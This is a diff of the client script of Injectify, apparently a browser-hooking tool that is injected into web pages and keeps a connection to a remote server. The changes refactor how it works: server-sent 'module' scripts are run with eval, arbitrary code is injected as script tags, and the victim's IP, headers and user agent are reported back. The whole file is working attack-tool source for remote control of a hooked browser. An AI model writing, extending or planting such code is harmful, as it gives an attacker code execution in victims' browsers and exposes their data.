@@ -118,10 +118,19 @@ window['injectify'] = /** @class */ (function () {
      * @param {element} targetParent element to execute the script under, defaults to document.head
      */
     Injectify.exec = function (func, targetParent) {
+        /**
+         * Default o using document.head as the script container
+         */
         if (!targetParent)
             targetParent = document.head;
-        if (typeof func == 'function')
+        /**
+         * Turn the function into a self-executing constructor
+         */
+        if (typeof func === 'function')
             func = '(' + func.toString() + ')()';
+        /**
+         * Create, append & remove a script tag
+         */
         var script = document.createElement('script');
         script.innerHTML = func;
         targetParent.appendChild(script);
@@ -133,13 +142,26 @@ window['injectify'] = /** @class */ (function () {
      * @param {(string|Object)} params parameters to be sent to the module
      * @param {function} callback optional callback once the module has been loaded
      */
-    Injectify.module = function (name, params, callback) {
-        if (typeof params === 'function')
+    Injectify.module = function (name, params, callback, errorCallback) {
+        var token = +new Date;
+        /**
+         * Parse the parameters
+         */
+        if (typeof params === 'function') {
             callback = params;
+            if (typeof callback === 'function')
+                window['e' + token] = callback;
+        }
         if (typeof callback === 'function')
-            window["callbackFor" + name] = callback;
+            window[token] = callback;
+        if (typeof errorCallback === 'function')
+            window['e' + token] = errorCallback;
+        /**
+         * Emit to server
+         */
         this.send('module', {
             name: name,
+            token: token,
             params: params
         });
     };
@@ -158,6 +180,9 @@ window['injectify'] = /** @class */ (function () {
          * Returns information about Injectify
          */
         get: function () {
+            /**
+             * Read the project name from the URL
+             */
             var project = ws.url.split('?')[1];
             if (this.debug)
                 project = project.substring(1);
@@ -168,7 +193,6 @@ window['injectify'] = /** @class */ (function () {
                 'ip': client.ip,
                 'headers': client.headers,
                 'user-agent': client.agent,
-                'connectTime': client.connectTime
             };
         },
         enumerable: true,
@@ -191,7 +215,7 @@ window['injectify'] = /** @class */ (function () {
          * Returns the amount of time connected to injectify server
          */
         get: function () {
-            var duration = (+new Date - this.info.connectTime) / 1000;
+            var duration = (+new Date - this['connectTime']) / 1000;
             return Math.round(duration);
         },
         enumerable: true,
@@ -207,6 +231,10 @@ window['injectify'] = /** @class */ (function () {
     return Injectify;
 }());
 /**
+ * Set the connect time
+ */
+window['injectify'].connectTime = +new Date;
+/**
  * Debug helpers
  */
 if (window['injectify'].debug) {
@@ -221,27 +249,40 @@ window['injectify'].listener(function (data, topic) {
             console.error(data);
             return;
         }
-        if (/^module:/.test(topic)) {
+        if (topic == 'module') {
             var module = {
-                name: topic.substring(7),
-                callback: window["callbackFor" + topic.substring(7)],
+                name: data.name,
+                token: data.token,
+                callback: window[data.token],
                 returned: undefined,
                 config: {
                     async: false
                 }
             };
-            if (data !== false) {
-                eval(data);
+            if (!data.error) {
+                /**
+                 * Evaluate the script
+                 */
+                eval(data.script);
+                /**
+                 * If in debug mode display verbose output
+                 */
                 if (window['injectify'].debug) {
                     console.warn('📦 Executed module "' + module.name + '"', module);
                 }
+                /**
+                 * If the module isn't asynchronous call it's callback
+                 */
                 if (!module.config.async && data !== false && typeof module.callback == 'function') {
                     module.callback(module.returned);
                 }
-                return delete window["callbackFor" + module.name];
+                /**
+                 * Delete it's synchronous callback
+                 */
+                return delete window[data.token];
             }
-            else if (window['injectify'].debug) {
-                console.error('📦 Module "' + module.name + '" not installed on server', module);
+            else if (window['injectify'].debug && data.error.message) {
+                console.error('📦 ' + data.error.message, module);
             }
         }
         if (topic == 'execute' || topic == 'core') {
@@ -249,11 +290,9 @@ window['injectify'].listener(function (data, topic) {
         }
     }
     catch (e) {
-        //if (JSON.stringify(e) == "{}") e = e.stack
-        if (window['injectify'].debug) {
-            //console.log(data)
-            throw e;
-        }
+        // if (window['injectify'].debug) {
+        // 	//throw e
+        // }
         window['injectify'].error(e.stack);
     }
 });
